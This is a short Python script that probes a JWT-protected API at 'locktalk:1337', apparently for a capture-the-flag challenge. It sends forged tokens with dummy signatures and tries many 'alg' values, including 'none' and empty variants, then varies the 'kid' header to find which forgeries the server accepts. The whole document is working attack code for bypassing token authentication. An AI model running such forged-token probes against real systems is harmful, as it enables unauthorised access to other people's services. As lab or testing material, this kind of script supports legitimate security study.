import base64, json, urllib.request, urllib.error

BASE = "http://locktalk:1337"

def b64(d):
    if isinstance(d, (dict, list)):
        d = json.dumps(d, separators=(',', ':'))
    if isinstance(d, str):
        d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def b64raw(d):
    return base64.b64encode(d if isinstance(d, bytes) else d.encode()).decode()

pl = b64({"sub": "x"})

def req(path, headers=None):
    r = urllib.request.Request(BASE + path, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=8) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return -1, repr(e)

def probe(label, header_obj, payload=pl, sig="AAAA", path="/api/v1/chat/1"):
    if isinstance(header_obj, dict):
        h = b64(header_obj)
    else:
        h = b64(header_obj)  # raw string
    tok = f"{h}.{payload}.{sig}"
    st, body = req(path, {"Authorization": tok})
    print(f"[{label:34s}] {st} | {body.strip()[:300]}")

print("=== algorithm whitelist probe (3-part tokens, dummy sig) ===")
for alg in ["RS256","RS384","RS512","HS256","HS384","HS512","ES256","ES384","ES512",
            "PS256","PS384","PS512","EdDSA","none","None","NONE","", "rs256", "RS256x"]:
    probe(f"alg={alg!r}", {"alg": alg, "typ": "JWT"})

print("\n=== header variations (alg RS256) ===")
probe("RS256 + kid=1", {"alg":"RS256","typ":"JWT","kid":"1"})
probe("RS256 + kid=1.pem", {"alg":"RS256","typ":"JWT","kid":"1.pem"})
probe("RS256 + kid=nonexistent", {"alg":"RS256","typ":"JWT","kid":"nonexistent"})
